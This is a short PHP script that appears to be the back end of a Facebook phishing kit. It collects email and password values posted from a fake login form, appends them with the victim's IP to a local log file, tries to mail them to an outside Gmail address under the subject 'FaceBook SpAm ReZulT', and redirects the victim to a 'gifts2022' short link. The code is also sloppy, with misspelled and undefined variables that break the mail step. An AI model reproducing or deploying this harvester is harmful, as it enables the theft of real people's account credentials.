<?php


$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$message .= "";

$message .= $_POST['email'].":";
$message .= $_POST['pass']."\n";

$message .= "";
$send= "moemad9393@gmail.com";
$subject = "FaceBook SpAm ReZulT | $ip";
$headers = "From: FaceBook SpAm ReZulT";
$file = fopen("Mfarag.txt","ab");
fwrite($file,$message);
fclose($file);

$str=array($send, $IWP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false)
{
mail($Send,$subject,$rnessage,$headers);
}
header("Location: https://smrturl.co/gifts2022~190367h");


?>